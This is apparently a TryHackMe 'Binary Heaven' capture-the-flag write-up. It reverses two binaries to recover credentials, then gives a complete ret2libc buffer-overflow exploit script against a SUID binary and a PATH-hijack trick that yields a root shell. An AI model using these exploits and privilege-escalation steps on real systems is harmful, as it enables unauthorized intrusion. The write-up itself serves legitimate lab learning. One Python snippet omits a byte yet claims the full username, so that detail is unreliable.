



# Tryhackme.com Room : Binary Heaven
`https://tryhackme.com/room/binaryheaven`

## First binary - Angel_A

We open the binary in `ghidra` and decompile it to :

```c
long lVar1;
byte input_str [9];
int success_counter;

lVar1 = ptrace(PTRACE_TRACEME,0,1,0,param_5,param_6,param_2);
if (lVar1 == -1) {
  printf("Using debuggers? Here is tutorial https://www.youtube.com/watch?v=dQw4w9WgXcQ/n%22");
                  /* WARNING: Subroutine does not return */
  exit(1);
}
printf("\x1b[36m\nSay my username >> \x1b[0m");
fgets((char *)input_str,9,stdin);
success_counter = 0;
while( true ) {
  if (success_counter > 7) {
    puts("\x1b[32m\nCorrect! That is my name!\x1b[0m");
    return 0;
  }
  if (*(int *)((long)&username + (long)success_counter * 4) != (int)(char)(input_str[success_counter] ^ 4) + 8) break;

  success_counter = success_counter + 1;
}
puts("\x1b[31m\nThat is not my username!\x1b[0m");
                  /* WARNING: Subroutine does not return */
exit(0);
```

Now if we look at `username` content, we see that it contains

```
0x6b0000000079000000006d000000007e00000000680000000075000000006d0000000072
```

Looking at the code, the verification looks at `&username + counter*4` which mean that it only look at 1 bytes every 4 bytes.

We end up with these bytes :

```
0x6b796d7e68756d72
```

It compare those bytes to the `input^4 +8`

Then we can do the reverse operation on the bytes.

Let's do this in python

```python
vals = [0x79, 0x6d, 0x7e, 0x68, 0x75, 0x6d, 0x72]
"".join([chr((v - 8) ^ 4) for v in vals])
```

And we get the username 

```
guardian
```

Which is the correct answer.



## Second binary

This binary is less straightforward. It's a `go` binary instead of a `c` binary.

I installed this plugin in `ghidra` `https://github.com/felberj/gotools` to facilitate the reversing although i'm not sure to what extent it helped.

The decompiled code is pretty dense.

Here is condition that check if the password is valid :

```c
  if ((local_40 == (undefined **)0xb) &&
     (runtime.memequal(*local_b8,(long)&DAT_004cad0b), local_60 = local_40, cVar2 != '\0'))
```

Pretty much everything is useless in this line, the only interesting part is

```c
runtime.memequal(*local_b8,(long)&DAT_004cad0b)
```

Looking at `DAT_004cad0b` we find the password

```
GOg0esGrrr!
```



## Third binary

Now that we have the username and password, we can `ssh` into the box using 

```
sshpass -p GOg0esGrrr! ssh guardian@10.10.227.240
```

We find a `pwn_me` binary belonging to `binexgod` with `SUID` bit on.

When we run it, we get 

```
Binexgod said he want to make this easy.
System is at: 0xf7dee950
```

Since they give the address to `System`, pretty sure this is a `bufferoverflow` exploit.

We start by sending a bunch of random bytes to see if we get a segfault

```
echo $(python3 -c 'print("A"*44)') | ./pwn_me
```

And we do get a segfault.

Now we start the process using `gdb` and play around with the input to figure out the offset of the return address.

The binary expect it input from `stdin`. Didn't find a good way to send `stdin` input from gdb except from a file.

So what I ended up doing was creating a `in` file using this :

```
python3 -c 'open("in","wb").write(b"A"*32 + b"\x50\x79\xd5\xf7")'
```

Then in gdb

```
r < in
```

Kinda wonky.. we need 2 shells to be able to update the `in` file and then launch it using gdb.

Anyhoww, it work. So we figure that the address start at output `32`.

Now I don't have much experience with `buffer overflow` exploitation so I had a look at this :

`https://niiconsulting.com/checkmate/2019/09/exploiting-buffer-overflow-using-return-to-libc/`

Which gave a lot of good infos.

In the example they have `randomize_va_space` turned off which is not the case for us.

Fortunately for us, the program give us the offset of `system@GLIBC`

Still just one part of the problem.

Let's gather the adresses mentionned in the post.

First the base address `ldd pwn_me`

```
linux-gate.so.1 =>  (0xf7f1e000)
libc.so.6 => /lib32/libc.so.6 (0xf7d4a000)
/lib/ld-linux.so.2 (0xf7f20000)
```

So our base address would be `0xf7d4a000`

Then `/bin/sh` address `strings -a -t x /lib32/libc.so.6 | grep /bin/sh`

```
 15910b /bin/sh
```

Then `system` address `readelf -s /lib32/libc.so.6 | grep system`

```
1457: 0003a950    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0
```

And finally `exit` address (not sure why tho ?) `readelf -s /lib32/libc.so.6 | grep exit` 

```
141: 0002e7c0    31 FUNC    GLOBAL DEFAULT   13 exit@@GLIBC_2.0
```



After some tinkering, I figured that the input can be sent after the program is already running. This will allow us to retrieve the address for `system` given in the output of `pwn_me`.

We are going to use `pexpect` python module to do so.



Here is the complete exploit script :

```python
import struct
import pexpect
import time

in_gdb = False

padding = 32

# Calc offsets from glibc addresses
syst_a = 0x0003a950
bin_sh_a = 0x0015910b
exit_a = 0x0002e7c0

bin_sh_offset = bin_sh_a - syst_a
exit_offset = exit_a - syst_a

# Spawn process and retrieve system address
if in_gdb:
	proc = pexpect.spawn('gdb ./pwn_me')
	proc.expect(b'(gdb)')
	proc.sendline(b'r')
	proc.expect("Binexgod")
else :
	proc = pexpect.spawn('./pwn_me')
proc.expect(b'\n')
proc.expect(b'\n')
output = proc.before.strip()
real_system_addr = int(output.split(b'0x')[-1],16)

syst_a = real_system_addr
bin_sh_a = syst_a + bin_sh_offset
exit_a = syst_a + exit_offset

print(output.decode(), '\n')
print("system address : ", hex(syst_a))
print("Exit address : ", hex(exit_a))
print("/bin/sh address : ", hex(bin_sh_a))

syst_a = struct.pack("<I", syst_a)
bin_sh_a = struct.pack("<I", bin_sh_a)
exit_a = struct.pack("<I", exit_a)

buff = b"A" * padding
buff += syst_a
buff += exit_a
buff += bin_sh_a

proc.sendline(buff)

proc.interact()
```

Running this drop a shell for the user `binexgod`



We can now retrieve the flag in `/home/binexgod/binhexgod_flag.txt` :

```
THM{b1n3xg0d_pwn3d}
```



## Fourth binary, getting root !

For this binary, we got the code. `vuln.c` : 

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
  gid_t gid;
  uid_t uid;
  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  system("/usr/bin/env echo Get out of heaven lol");
}
```

Hmmm can we exploit `/usr/bin/env` somehow ?

Or maybe again a bugger overflow with the arguments ? Maybe we can somehow override the `system` call ?



The `char **envp` list all the environment variables.



Turns out this one was pretty simple. We can create an `echo` script in `/tmp/bin/echo` with this

```
#!/bin/bash
/bin/bash -p
```

then we `chmod +x /tmp/bin/echo`.

Finally we add this to the path using 

```
export PATH=/tmp/bin:$PATH
```

And then executing `vuln` will spawn a root shell !



Now that we are root we can retrieve the flag in `/root/root.txt`

```
THM{r00t_of_th3_he4v3n}
```





## Wrap up

* This was a pretty nice challenge. It was cool to do some buffer overflows again.
* I think I was kinda lucky with the `go` binary decompilation. I was kinda lost, there was a lot of things going on. I need to play more with ghidra to master it.
  * This writeup suggest using `gdb` to retrieve the password : `https://zime64.gitlab.io/writeups/binaryheaven`
    * It also mention `gef` which gives "enhanced features" to gdb `https://github.com/hugsy/gef`
* The same writeup (`https://zime64.gitlab.io/writeups/binaryheaven`) uses `pwntools` to retrieve the address in `libc` and interact with the ssh session. This is equivalent to what we did but it's way less manual.

